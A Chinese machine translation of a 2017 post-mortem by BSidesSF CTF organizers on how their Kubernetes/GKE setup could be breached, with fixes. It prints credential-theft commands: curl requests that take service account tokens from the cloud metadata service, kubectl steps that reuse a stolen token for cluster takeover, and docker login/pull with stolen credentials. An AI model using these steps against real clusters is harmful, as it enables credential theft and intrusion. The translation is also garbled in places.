<html>
<head>
<title>Capturing all the flags in BSidesSF CTF by pwning our infrastructure</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过改造我们的基础设施来夺取CTF所有的国旗</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0?source=collection_archive---------6-----------------------#2017-04-10">https://medium.com/hackernoon/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0?source=collection_archive---------6-----------------------#2017-04-10</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><p id="c0b1" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">【2018年7月编辑:这篇文章写于2017年，从那时起，快速发展的k8s世界发生了相当大的变化。几个注意事项:</p><ul class=""><li id="bf81" class="jq jr hu it b iu iv iy iz jc js jg jt jk ju jo jv jw jx jy dt translated"><em class="jp">您现在可以用</em> <code class="eh ka kb kc kd b"><strong class="it hv"><em class="jp">automountServiceAccountToken: false</em></strong></code>禁用服务账户令牌的  <em class="jp">自动挂载</em></li><li id="5283" class="jq jr hu it b iu ke iy kf jc kg jg kh jk ki jo jv jw jx jy dt translated"><em class="jp">在GKE上，您使用</em> <a class="ae jz" href="https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment" rel="noopener ugc nofollow" target="_blank"> <em class="jp">元数据代理</em> </a> <em class="jp">来阻止pods从元数据服务访问某些秘密。</em></li><li id="da9e" class="jq jr hu it b iu ke iy kf jc kg jg kh jk ki jo jv jw jx jy dt translated"><em class="jp">这篇文章完全忽略了通过元数据服务可以获得的有趣的k8s秘密。看看这个</em> <a class="ae jz" href="https://hackerone.com/reports/341876" rel="noopener ugc nofollow" target="_blank"> <em class="jp">可怕的bug赏金报告</em> </a> <em class="jp">的例子，看看如何通过访问这些秘密把一个SSRF变成RCE。</em></li><li id="db4e" class="jq jr hu it b iu ke iy kf jc kg jg kh jk ki jo jv jw jx jy dt translated">许多工作正在进行中，以支持k8s中的硬多租户，这将使举办CTF竞赛更加可行。</li></ul><p id="b77d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><em class="jp">现在来看原文……</em></p><p id="e8ae" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">TLDR</strong>:CTF bside SSF的挑战是在Kubernetes上使用<a class="ae jz" href="https://hackernoon.com/tagged/google" rel="noopener ugc nofollow" target="_blank">谷歌</a>容器引擎的Docker容器中进行的。由于这两个基础设施问题，有可能利用早期的挑战之一，窃取服务帐户密钥，然后使用这些密钥直接访问标志。其中一个问题被竞争对手发现了(但没有被利用)。</p><p id="fe23" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">在RSA之前的那个周末(2月11日—2月13日)，我们为BsidesSF举办了“捕捉旗帜”竞赛。它的目标是初级/中级玩家，结果非常成功，有超过500个团队参加了国际比赛。我们决定在谷歌容器引擎(GKE)上运行docker容器中的所有挑战。我不会过多地探究这个决定，但作为一个有时间限制的小团队，Docker和Kubernetes允许我们将精力集中在编写有趣的挑战上，并使部署、维护和扩展变得非常简单。虽然它对我们有用，但是有很多原因说明这些工具可能不适合CTFs。</p><p id="15ef" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">CTF是黑客的乐园，许多挑战将允许竞争者在你的机器上运行任意代码。参赛者应该能够做他们想做的任何事情，只要他们不能干扰其他团队，破坏挑战，或者访问范围之外的资源(其他旗帜，记分牌等)。)因此，隔离挑战资源至关重要。在与其他一些CTF组织者交谈后，我了解到这种隔离通常是通过完全独立的主机、ESXi或Xen下的虚拟机或简单的chroot监狱来实现的。使用Docker，我们部署的许多挑战都在同一个主机上，隔离是由内核名称空间和控制组提供的——这是这项技术背后的linux内核特性。</p><p id="c1c3" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">Docker和Kubernetes共同推出了新的攻击面，可以让竞争对手打破挑战隔离。即:</p><ol class=""><li id="dd43" class="jq jr hu it b iu iv iy iz jc js jg jt jk ju jo kj jw jx jy dt translated"><strong class="it hv">Linux内核</strong>。在一台机器上运行的所有容器共享主机的内核，并使用内核名称空间进行分隔。任何允许竞争对手绕过这些内核实施的攻击都可能允许他们逃离容器并访问资源以应对其他挑战。</li><li id="52e4" class="jq jr hu it b iu ke iy kf jc kg jg kh jk ki jo kj jw jx jy dt translated"><strong class="it hv">Kubernetes API。</strong>用足够的凭证访问它将使竞争者完全控制集群中的容器。获取其他挑战的标志就像运行:<code class="eh ka kb kc kd b">kubectl exec a_pod — cat /flag . </code> Kubernetes还管理etcd数据库中的集群状态，但幸运的是，GKE禁止从集群的其他部分访问该数据库。</li><li id="3ba1" class="jq jr hu it b iu ke iy kf jc kg jg kh jk ki jo kj jw jx jy dt translated"><strong class="it hv">私有Docker注册表。在GKE上，Docker图片通常存储在平台提供的私有Docker注册表中。在我们的例子中，其中一些图像包含挑战源代码和标志。如果竞争对手能够提取这些图像，他们将能够很容易地从中提取旗帜。</strong></li></ol><p id="36bb" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">让我们逐一浏览一下。</p><h1 id="045b" class="kk kl hu bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh dt translated">1.内核攻击面</h1><p id="1dae" class="pw-post-body-paragraph ir is hu it b iu li iw ix iy lj ja jb jc lk je jf jg ll ji jj jk lm jm jn jo hn dt translated">Docker文档有关于Docker <a class="ae jz" href="https://docs.docker.com/engine/security/security/" rel="noopener ugc nofollow" target="_blank">安全模型</a>的非常详尽的文档。尽管容器通常不被认为是虚拟机的合适替代品，但我们认为我们足够信任linux内核<em class="jp">提供的隔离。</em>我们以无特权用户的身份在容器内运行所有挑战，需要网络隔离的挑战被部署到不同的集群。我们还计划使用Kubernetes <a class="ae jz" href="https://kubernetes.io/docs/user-guide/security-context/" rel="noopener ugc nofollow" target="_blank">容器安全上下文</a>和应用seccomp概要文件，但遗憾的是没有时间做这些。无论哪种方式，容器逃逸肯定不是微不足道的，通常需要像<a class="ae jz" href="https://dirtycow.ninja/" rel="noopener ugc nofollow" target="_blank"> Dirty Cow </a>这样的内核漏洞。似乎不太可能有人会把其中的一个拿出来给我们相对不为人知的、初级到中级的CTF。</p><h1 id="18f1" class="kk kl hu bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh dt translated">2.Kubernetes API</h1><p id="74c0" class="pw-post-body-paragraph ir is hu it b iu li iw ix iy lj ja jb jc lk je jf jg ll ji jj jk lm jm jn jo hn dt translated">下一个强化任务是确保运行在容器内部的流程不能访问Kubernetes API。不幸的是，这是我们研究失败的第一个地方。我们假设容器代表一个信任边界，并且在这些容器中运行的进程通常不需要访问或修改集群状态。运行容器的节点显然需要访问API来允许容器的调度，但是除非明确启用，否则从容器内部访问API是有意义的。CTF的竞争对手@traviscline 很快证明这是错误的。</p><p id="a96a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">事实证明，当pods(Kubernetes对一组容器的抽象)被创建时，它们被自动分配了默认的服务帐户，并且创建了一个包含用于访问Kubernetes API的令牌的新卷。然后在<code class="eh ka kb kc kd b">/var/run/secrets/kubernetes.io/serviceaccount</code>将该卷<a class="ae jz" href="https://kubernetes.io/docs/admin/service-accounts-admin/" rel="noopener ugc nofollow" target="_blank"> <em class="jp">装入容器</em> </a>中的所有容器。该目录中的访问令牌是查看集群状态和在容器中执行任意命令所需的全部内容。</p><p id="71f4" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">如何偷旗</strong></p><p id="f58f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">从特拉维斯的角度来看，它是这样的:</p><blockquote class="ln lo lp"><p id="0de3" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">“Zumbo”挑战的第二阶段需要路径遍历攻击来读取文件系统上<code class="eh ka kb kc kd b">/flag</code>中的文件。我利用这个漏洞读取了<code class="eh ka kb kc kd b">/etc/hosts</code>，并注意到Kubernetes添加的默认注释，表明这个挑战正在Kubernetes上的一个容器中运行。</p></blockquote><pre class="lt lu lv lw fq lx kd ly lz aw ma dt"><span id="6a9c" class="mb kl hu kd b fv mc md l me mf"># Kubernetes-managed hosts file.<br/>127.0.0.1       localhost<br/>::1     localhost ip6-localhost ip6-loopback=<br/>fe00::0 ip6-localnet<br/>fe00::0 ip6-mcastprefix<br/>fe00::1 ip6-allnodes<br/>fe00::2 ip6-allrouters<br/>172.17.0.4      apache-1336197910-847nq</span></pre><blockquote class="ln lo lp"><p id="66c9" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">从那里我使用相同的路径遍历漏洞来访问<code class="eh ka kb kc kd b">/var/run/secrets/kubernetes.io/serviceaccount</code>中的秘密</p><p id="75bf" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">最容易完成的事情是简单地在系统上获得一个可执行的<code class="eh ka kb kc kd b">kubectl </code>二进制文件。Zumbo容器有curl和一个可写/可执行的<code class="eh ka kb kc kd b">/tmp</code>，所以这里没有障碍。虽然我们可以自己编写api请求，并将其发送给getent主机kubernetes。kubectl使得集群危害变得微不足道，因为它将使用serviceaccount令牌，而无需额外提示。</p><p id="29eb" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">公开内部集群服务(如仪表板)并启动具有外部网络连接的新容器展示了集群接管并提供了持久性选项。</p><p id="1322" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">在这种情况下，集群管理意味着通过<code class="eh ka kb kc kd b">kubectl exec</code>对所有挑战进行完整的文件系统访问。对于大多数挑战，这意味着标志是直接可读的。我选择提醒组织者，避免破坏其他人的兴致。</p><p id="56ae" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">这里<a class="ae jz" href="https://gist.github.com/tmc/8cd2364f7b6702ac6318c64a3d17e32d" rel="noopener ugc nofollow" target="_blank">展示了所采取步骤的粗略重现。</a></p><p id="3f59" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">在retrospect中，通过识别公共ip和配置本地客户端，远程群集访问会更容易。类似于<code class="eh ka kb kc kd b">curl -k -H ‘Authorization: Bearer ${serviceaccount_token} <a class="ae jz" href="https://kubernetes/api" rel="noopener ugc nofollow" target="_blank">https://kubernetes/api</a></code>的环境内请求公开了apiserver的public。拥有这两个值意味着您可以从任何机器设置集群管理访问，如下所示:</p></blockquote><pre class="lt lu lv lw fq lx kd ly lz aw ma dt"><span id="cdbd" class="mb kl hu kd b fv mc md l me mf">kubectl config set-cluster pwned — server=https://${public_ip} — insecure-skip-tls-verify</span><span id="9717" class="mb kl hu kd b fv mg md l me mf">kubectl config set-credentials pwn — token=${serviceacount_token}</span><span id="73df" class="mb kl hu kd b fv mg md l me mf">kubectl config set-context pwned — cluster=pwned — user=pwn</span><span id="9140" class="mb kl hu kd b fv mg md l me mf">kubectl config use-context pwned</span></pre><blockquote class="ln lo lp"><p id="1509" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">回忆录:</p></blockquote><figure class="lt lu lv lw fq mi fe ff paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="fe ff mh"><img src="../Images/8544fc5ec47029d9916add5b0529b00b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O45iceOlN6GUriyGLR2uuQ@2x.png"/></div></div></figure><p id="c570" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">修复此问题</strong></p><p id="0829" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">接到通知后，我努力尽快解决问题。浏览文档，似乎没有一个简单的方法来禁用这个特性。通过更多的研究，我在Github上发现了这个问题。显然，API凭证的自动挂载是为了向后兼容而保留的特性，当时没有办法禁用它。解决方法是在Kubernetes挂载服务帐户凭据的位置挂载一个空的只读卷。</p><pre class="lt lu lv lw fq lx kd ly lz aw ma dt"><span id="c381" class="mb kl hu kd b fv mc md l me mf">  volumeMounts:<br/>    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount<br/>      name: no-api-access-please<br/>      readOnly: true<br/>volumes:<br/>  - name: no-api-access-please<br/>    emptyDir: {}</span></pre><p id="c7ea" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">含义</strong></p><p id="3431" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">事后看来，这是一个非常明显的疏忽，如果更彻底地通读文档，本可以很容易地避免。也就是说，我认为这是一个不安全的默认设置，应该立即禁用。这种行为可能会让攻击者从相对简单的web应用程序错误(文件泄露)转向整个基础结构的破坏。Kubernetes社区很清楚这个问题。长期解决方案是基于角色的访问控制插件，它允许更细粒度的访问控制，并可用于限制服务帐户可以访问的资源。这个特性最近被提升到了Kubernetes测试版，并且很快会进入GKE。</p><h1 id="b74b" class="kk kl hu bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh dt translated">3.私人码头登记处</h1><p id="1d94" class="pw-post-body-paragraph ir is hu it b iu li iw ix iy lj ja jb jc lk je jf jg ll ji jj jk lm jm jn jo hn dt translated">这是我们犯第二个错误的地方。Google平台上的私有docker注册表只是Google云存储中的一个桶。集群中的节点需要能够从注册表中提取，因此只读凭证通过在<a class="ae jz" href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying" rel="noopener ugc nofollow" target="_blank">实例元数据</a>中传递的服务帐户凭证提供给节点，这些凭证可通过在<code class="eh ka kb kc kd b"><a class="ae jz" href="http://169.254.169.254" rel="noopener ugc nofollow" target="_blank">http://169.254.169.254</a> </code>监听的http服务提供给节点。不幸的是，我们在计划时忽略了这个重要的细节。因为我们的一些容器将标志嵌入到映像中，而不是作为卷安装，所以有可能在其中一个挑战中使用远程代码执行漏洞来读取服务帐户凭据，然后提取我们的容器。</p><p id="2036" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">如何偷旗:</strong></p><p id="ee7d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">使用RCE或SSRF，攻击者会向元数据服务发出请求，获取默认的服务帐户电子邮件和访问令牌。</p><pre class="lt lu lv lw fq lx kd ly lz aw ma dt"><span id="4fdd" class="mb kl hu kd b fv mc md l me mf"># Assuming you have code execution within the container</span><span id="f9c9" class="mb kl hu kd b fv mg md l me mf">$ curl <a class="ae jz" href="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email" rel="noopener ugc nofollow" target="_blank">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email</a></span><span id="ea51" class="mb kl hu kd b fv mg md l me mf">something-something@developer.gserviceaccount.com</span><span id="2ea6" class="mb kl hu kd b fv mg md l me mf">$ curl -s <a class="ae jz" href="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" rel="noopener ugc nofollow" target="_blank">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</a></span><span id="ce66" class="mb kl hu kd b fv mg md l me mf">{"access_token": "something-something", "expires_in":1881,"token_type":"Bearer"}</span></pre><p id="30ac" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">使用这两条信息，您可以使用Docker直接从我们的私有注册表中提取图像。</p><pre class="lt lu lv lw fq lx kd ly lz aw ma dt"><span id="c9a4" class="mb kl hu kd b fv mc md l me mf"># Using the credentials you have stolen from the previous steps<br/>$ docker login -e &lt;email&gt; -u oauth2accesstoken -p "&lt;access token&gt;" <a class="ae jz" href="https://gcr.io" rel="noopener ugc nofollow" target="_blank">https://gcr.io</a></span><span id="9e82" class="mb kl hu kd b fv mg md l me mf">$ docker pull gcr.io/bsides-ctf-2017/zumbo</span><span id="0979" class="mb kl hu kd b fv mg md l me mf"># Extract flags from container..</span></pre><p id="143b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">这假设您有一些内部知识:我们项目的名称和图像名称，这两个名称都不会太难猜测，并且可能通过其他方式发现。</p><p id="8f50" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">修复此问题</strong></p><p id="73b9" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们可以通过确保所有挑战资源(标志、二进制文件、源代码等)来避免这个问题。)通过安装的卷添加到容器中。如果我们对所有的挑战都这样做，我们的图像基本上可以是公开的——提取它们不会给CTF参与者带来任何有趣的东西。对于我们的一些挑战来说，从图像中完全删除私有资源是很困难的。更理想的设置是拒绝从容器内部访问元数据服务。我还没有尝试过这一点，但是通过使用像Lyft的metadataproxy这样的工具来代理从容器到元数据服务的连接，这可能是可以实现的。</p><p id="2dd7" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">牵连</strong></p><p id="7860" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">与前一个问题不同，这当然不是一个不安全的默认，而是这个平台是如何设计工作的。它并不局限于GKE，谷歌云和AWS都依赖http服务作为向实例分发元数据和某些秘密的方法，使这些秘密可供机器上运行的任何进程使用。在这些平台上进行构建时，了解这一点绝对是非常有用的。</p><h1 id="bcc7" class="kk kl hu bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh dt translated">结论</h1><p id="ab8a" class="pw-post-body-paragraph ir is hu it b iu li iw ix iy lj ja jb jc lk je jf jg ll ji jj jk lm jm jn jo hn dt translated">这是一个有趣的实验，但我们可能不会在我们的下一个CTF中使用相同的设置。虽然Kubernetes使得一切都可以很容易地启动和运行，但它增加了大量的复杂性和攻击面。从根本上说，它不是为运行不受信任的代码而设计的，因此，在威胁模型涉及让攻击者执行任意代码的情况下，它可能不是捕获标志的好选择。</p><h1 id="a8cd" class="kk kl hu bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh dt translated">更多阅读</h1><p id="b9e6" class="pw-post-body-paragraph ir is hu it b iu li iw ix iy lj ja jb jc lk je jf jg ll ji jj jk lm jm jn jo hn dt translated">为了更好地概述GKE上容器的进一步加固选项以及Kubernetes <a class="ae jz" href="https://hackernoon.com/tagged/security" rel="noopener ugc nofollow" target="_blank">安全</a>路线图，请查看<a class="ae jz" href="https://www.youtube.com/watch?v=Cd4JU7qzYbE" rel="noopener ugc nofollow" target="_blank"> Alex Mohr和Jessie Frazelle在Google Next 2017上的演讲</a>。这是一个非常精彩的演讲，我很遗憾它没有在两个月前发表。</p><p id="9945" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">保护自托管Kubernetes集群本身就是一件棘手的事情，我所见过的最好的指导来自<a class="ae jz" href="https://www.youtube.com/watch?v=BER8uridVIs" rel="noopener ugc nofollow" target="_blank"> Jesse Endahl在BsidesSF 2017 </a>上的演讲。Kelsey Hightower还维护了一个很棒的关于建立Kubernetes集群的教程<a class="ae jz" href="https://github.com/kelseyhightower/kubernetes-the-hard-way" rel="noopener ugc nofollow" target="_blank">。</a></p><p id="d985" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">如果你想了解更多关于Docker安全模型和容器安全性的知识，请查看NCC关于容器安全性的白皮书。</p><p id="f5c9" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">想聊聊CTF、集装箱或其他与安全相关的话题吗？在Twitter上关注<a class="ae jz" href="https://twitter.com/CornflakeSavage" rel="noopener ugc nofollow" target="_blank">我</a>。</p><div class="lt lu lv lw fq ab cb"><figure class="mp mi mq mr ms mt mu paragraph-image"><a href="http://bit.ly/HackernoonFB"><img src="../Images/50ef4044ecd4e250b5d50f368b775d38.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*0hqOaABQ7XGPT-OYNgiUBg.png"/></a></figure><figure class="mp mi mq mr ms mt mu paragraph-image"><a href="https://goo.gl/k7XYbx"><img src="../Images/979d9a46439d5aebbdcdca574e21dc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*Vgw1jkA6hgnvwzTsfMlnpg.png"/></a></figure><figure class="mp mi mq mr ms mt mu paragraph-image"><a href="https://goo.gl/4ofytp"><img src="../Images/2930ba6bd2c12218fdbbf7e02c8746ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*gKBpq1ruUi0FVK2UM_I4tQ.png"/></a></figure></div><blockquote class="ln lo lp"><p id="f922" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated"><a class="ae jz" href="http://bit.ly/Hackernoon" rel="noopener ugc nofollow" target="_blank">黑客中午</a>是黑客如何开始他们的下午。我们是<a class="ae jz" href="http://bit.ly/atAMIatAMI" rel="noopener ugc nofollow" target="_blank"> @AMI </a>家庭的一员。我们现在<a class="ae jz" href="http://bit.ly/hackernoonsubmission" rel="noopener ugc nofollow" target="_blank">接受投稿</a>并乐意<a class="ae jz" href="mailto:partners@amipublications.com" rel="noopener ugc nofollow" target="_blank">讨论广告&amp;赞助</a>机会。</p><p id="708a" class="ir is jp it b iu iv iw ix iy iz ja jb lq jd je jf lr jh ji jj ls jl jm jn jo hn dt translated">如果你喜欢这个故事，我们推荐你阅读我们的<a class="ae jz" href="http://bit.ly/hackernoonlatestt" rel="noopener ugc nofollow" target="_blank">最新科技故事</a>和<a class="ae jz" href="https://hackernoon.com/trending" rel="noopener ugc nofollow" target="_blank">趋势科技故事</a>。直到下一次，不要把世界的现实想当然！</p></blockquote><figure class="lt lu lv lw fq mi fe ff paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="fe ff mv"><img src="../Images/be0ca55ba73a573dce11effb2ee80d56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35tCjoPcvq6LbB3I6Wegqw.jpeg"/></div></div></figure><figure class="lt lu lv lw fq mi"><div class="bz el l di"><div class="mw mx l"/></div></figure></div></div>    
</body>
</html>